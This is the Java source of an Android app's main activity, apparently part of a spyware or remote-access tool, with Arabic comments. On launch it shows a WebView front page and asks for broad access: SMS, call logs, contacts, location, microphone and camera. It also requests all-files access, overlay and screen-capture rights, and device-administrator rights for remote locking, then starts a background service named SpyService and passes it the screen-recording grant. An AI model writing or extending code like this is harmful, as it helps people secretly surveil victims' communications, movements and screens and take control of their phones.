package com.black.phone;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.google.firebase.FirebaseApp;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST = 1001;
    private static final int OVERLAY_REQUEST = 1002;
    private static final int STORAGE_REQUEST = 1003;
    private static final int MEDIA_PROJECTION_REQUEST = 1004;
    private static final int ADMIN_REQUEST = 1005;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // تهيئة Firebase قبل أي شيء
        if (FirebaseApp.getApps(this).isEmpty()) {
            FirebaseApp.initializeApp(this);
        }

        WebView webView = findViewById(R.id.webView);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl(Config.get(this).getWebviewUrl());

        // طلب جميع الصلاحيات
        requestAllPermissions();

        // طلب صلاحية مشرف الجهاز
        requestDeviceAdmin();

        // بدء الخدمة
        startService(new Intent(this, SpyService.class));
    }

    private void requestAllPermissions() {
        List<String> perms = new ArrayList<>();
        String[] needed = {
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.CAMERA,
                Manifest.permission.POST_NOTIFICATIONS,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.BLUETOOTH_CONNECT,
                Manifest.permission.ANSWER_PHONE_CALLS,
                Manifest.permission.WRITE_CONTACTS,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.SEND_SMS,
                Manifest.permission.VIBRATE,
                Manifest.permission.ACCESS_WIFI_STATE,
                Manifest.permission.CHANGE_WIFI_STATE
        };

        // إضافة صلاحيات Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.READ_MEDIA_IMAGES);
            perms.add(Manifest.permission.READ_MEDIA_VIDEO);
            perms.add(Manifest.permission.READ_MEDIA_AUDIO);
        }

        for (String p : needed) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                perms.add(p);
            }
        }

        if (!perms.isEmpty()) {
            ActivityCompat.requestPermissions(this, perms.toArray(new String[0]), PERMISSION_REQUEST);
        } else {
            Toast.makeText(this, "✅ جميع الصلاحيات مفعلة", Toast.LENGTH_SHORT).show();
        }

        // صلاحية التطبيقات العلوية
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, OVERLAY_REQUEST);
        }

        // صلاحية مدير الملفات (Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, STORAGE_REQUEST);
            }
        }

        // صلاحية تسجيل الشاشة (للبث)
        MediaProjectionManager mpManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        if (mpManager != null) {
            startActivityForResult(mpManager.createScreenCaptureIntent(), MEDIA_PROJECTION_REQUEST);
        }
    }

    private void requestDeviceAdmin() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, DeviceAdmin.class);
            if (!dpm.isAdminActive(admin)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "صلاحية مشرف الجهاز مطلوبة لقفل الجهاز عن بعد");
                startActivityForResult(intent, ADMIN_REQUEST);
            } else {
                Toast.makeText(this, "✅ صلاحية مشرف الجهاز مفعلة", Toast.LENGTH_SHORT).show();
            }
        } catch (Exception e) {
            Toast.makeText(this, "⚠️ لا يمكن طلب صلاحية المشرف: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST) {
            int granted = 0;
            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    granted++;
                }
            }
            Toast.makeText(this, "✅ تم منح " + granted + "/" + permissions.length + " صلاحيات", Toast.LENGTH_LONG).show();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == MEDIA_PROJECTION_REQUEST && resultCode == Activity.RESULT_OK) {
            Intent intent = new Intent(this, SpyService.class);
            intent.putExtra("mediaProjectionResultCode", resultCode);
            intent.putExtra("mediaProjectionData", data);
            startService(intent);
            Toast.makeText(this, "✅ تم الحصول على صلاحية تسجيل الشاشة", Toast.LENGTH_SHORT).show();
        }
        if (requestCode == ADMIN_REQUEST && resultCode == Activity.RESULT_OK) {
            Toast.makeText(this, "✅ تم تفعيل صلاحية مشرف الجهاز", Toast.LENGTH_SHORT).show();
        }
    }
}
